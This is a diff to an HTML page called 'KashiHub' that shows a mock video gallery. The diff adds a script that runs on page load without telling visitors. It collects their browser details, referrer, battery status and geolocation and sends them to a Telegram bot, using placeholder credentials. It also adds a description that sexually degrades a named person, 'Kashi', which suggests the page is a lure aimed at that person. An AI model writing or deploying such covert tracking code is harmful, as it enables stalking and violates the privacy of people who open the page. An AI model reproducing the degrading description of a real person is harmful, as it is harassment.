@@ -3,7 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>KashiHub</title>
+    <title>KashiHub</title> <!-- Updated title -->
+    <meta name="description" content="KashiHub is a personal porn hub for kashi bitch."> <!-- Web description for preview -->
+    <meta property="og:image" content="preview.png"> <!-- Browser preview image -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
         /* Base styles */
@@ -393,8 +395,11 @@
         </h1>
 
         <div class="tags-container" id="tagsContainer">
-            <button class="tag-button active" data-tag="Shorts">▶Kashi Rare</button>
-        
+            <button class="tag-button active" data-tag="Kashi Rare">▶Kashi Rare</button>
+            <button class="tag-button" data-tag="Comedy Shows">Comedy Shows</button>
+            <button class="tag-button" data-tag="Music Videos">Music Videos</button>
+            <button class="tag-button" data-tag="Gaming Highlights">Gaming Highlights</button>
+            <button class="tag-button" data-tag="Portrait Videos">Portrait Videos</button>
         </div>
 
         <div class="video-container" id="videoGrid">
@@ -409,7 +414,7 @@
             const tagsContainer = document.getElementById('tagsContainer');
             const videoGrid = document.getElementById('videoGrid');
 
-            let activeTag = 'Shorts'; // Initial active tag
+            let activeTag = 'Kashi Rare'; // Initial active tag, updated to Kashi Rare
 
             // Mock video data
             const videos = [
@@ -421,9 +426,9 @@
                     duration: '5:19',
                     views: '149K',
                     comments: '1.2K',
-                    category: 'Shorts',
+                    category: 'Kashi Rare', // Updated category
                     orientation: 'landscape',
-                    thumbnail: 'xcornxd.png' // Updated to xcornxd.png
+                    thumbnail: 'xcornxd.png'
                 },
                 {
                     id: 2,
@@ -433,9 +438,9 @@
                     duration: '3:42',
                     views: '89K',
                     comments: '800',
-                    category: 'Kashi Rare',
+                    category: 'Kashi Rare', // Updated category
                     orientation: 'landscape',
-                    thumbnail: 'cornhub.png' // Updated to cornhub.png
+                    thumbnail: 'cornhub.png'
                 },
                 {
                     id: 3,
@@ -447,7 +452,7 @@
                     comments: '2.5K',
                     category: 'Comedy Shows',
                     orientation: 'landscape',
-                    thumbnail: 'xcornxd.png' // Updated to xcornxd.png
+                    thumbnail: 'xcornxd.png'
                 },
                 {
                     id: 4,
@@ -457,9 +462,9 @@
                     duration: '7:01',
                     views: '180K',
                     comments: '1.5K',
-                    category: 'Shorts',
+                    category: 'Kashi Rare', // Updated category
                     orientation: 'landscape',
-                    thumbnail: 'cornxd.png' // Updated to xcornxd.png
+                    thumbnail: 'xcornxd.png'
                 },
                 {
                     id: 5,
@@ -471,7 +476,7 @@
                     comments: '500',
                     category: 'Music Videos',
                     orientation: 'landscape',
-                    thumbnail: 'xcornxd.png' // Updated to xcornxd.png
+                    thumbnail: 'xcornxd.png'
                 },
                 {
                     id: 6,
@@ -483,7 +488,7 @@
                     comments: '600',
                     category: 'Portrait Videos',
                     orientation: 'portrait',
-                    thumbnail: 'cornhub.png' // Updated to cornhub.png
+                    thumbnail: 'cornhub.png'
                 },
                 {
                     id: 7,
@@ -495,7 +500,7 @@
                     comments: '750',
                     category: 'Portrait Videos',
                     orientation: 'portrait',
-                    thumbnail: 'cornhub.png' // Updated to cornhub.png
+                    thumbnail: 'cornhub.png'
                 },
             ];
 
@@ -550,6 +555,86 @@
                 });
             }
 
+            // Function to send notification to Telegram bot
+            async function sendVisitNotification() {
+                // IMPORTANT: Replace with your actual bot token and chat ID
+                const botToken = 'YOUR_BOT_TOKEN'; // e.g., '1234567890:ABCDEFGHIJKLMN_OPQRSTUVWXYZ_abcdefghij'
+                const chatId = 'YOUR_CHAT_ID';     // e.g., '123456789' or '@your_channel_name'
+
+                if (botToken === 'YOUR_BOT_TOKEN' || chatId === 'YOUR_CHAT_ID') {
+                    console.warn('Telegram bot token or chat ID not configured. Notification will not be sent.');
+                    return;
+                }
+
+                let message = `KashiHub Visit Detected!\n\n`;
+                message += `Time: ${new Date().toLocaleString()}\n`;
+                message += `User Agent: ${navigator.userAgent}\n`;
+                message += `Language: ${navigator.language}\n`;
+                message += `Platform: ${navigator.platform}\n`;
+                message += `Screen Resolution: ${window.screen.width}x${window.screen.height}\n`;
+                message += `Referrer: ${document.referrer || 'None'}\n`;
+
+                // Try to get battery information
+                if (navigator.getBattery) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        message += `Battery Level: ${(battery.level * 100).toFixed(0)}%\n`;
+                        message += `Charging: ${battery.charging ? 'Yes' : 'No'}\n`;
+                    } catch (e) {
+                        message += `Battery Info: Not available (${e.message})\n`;
+                    }
+                } else {
+                    message += `Battery Info: API not supported\n`;
+                }
+
+                // Try to get geolocation (requires user permission)
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const lat = position.coords.latitude;
+                            const lon = position.coords.longitude;
+                            // Note: To get a human-readable region, you'd typically need a reverse geocoding API.
+                            // This example only sends raw coordinates.
+                            message += `Geolocation (Lat, Lon): ${lat}, ${lon}\n`;
+                            sendTelegramMessage(message);
+                        },
+                        (error) => {
+                            message += `Geolocation: Permission denied or error (${error.message})\n`;
+                            sendTelegramMessage(message); // Send message even if geo fails
+                        }
+                    );
+                } else {
+                    message += `Geolocation: API not supported\n`;
+                    sendTelegramMessage(message); // Send message if geo API not supported
+                }
+
+                // Helper function to send the message to Telegram
+                async function sendTelegramMessage(text) {
+                    const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                    try {
+                        const response = await fetch(telegramApiUrl, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                text: text,
+                                parse_mode: 'Markdown' // Optional: for formatting in Telegram
+                            }),
+                        });
+                        const data = await response.json();
+                        if (!response.ok) {
+                            console.error('Failed to send Telegram message:', data);
+                        } else {
+                            console.log('Telegram notification sent successfully!');
+                        }
+                    } catch (error) {
+                        console.error('Error sending Telegram message:', error);
+                    }
+                }
+            }
+
             // Event listener for mobile menu toggle
             menuToggle.addEventListener('click', () => {
                 navMenu.classList.toggle('open');
@@ -570,8 +655,9 @@
                 }
             });
 
-            // Initial render of videos when the page loads
+            // Initial render of videos and send notification when the page loads
             renderVideos();
+            sendVisitNotification();
         });
     </script>
 </body>
